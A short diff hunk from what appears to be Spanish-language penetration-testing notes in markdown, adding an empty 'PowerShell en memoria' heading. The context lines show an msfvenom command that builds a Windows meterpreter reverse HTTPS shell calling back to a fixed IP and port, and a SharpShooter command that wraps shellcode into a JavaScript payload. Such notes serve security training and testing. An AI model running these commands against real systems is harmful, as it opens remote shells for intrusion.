@@ -25,4 +25,7 @@ msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.100.9 LPORT=4444
 python SharpShooter.py --payload js --dotnetver 4 --stageless --rawscfile shell.txt --output test
 ```
 
+### PowerShell en memoria
+
+
 
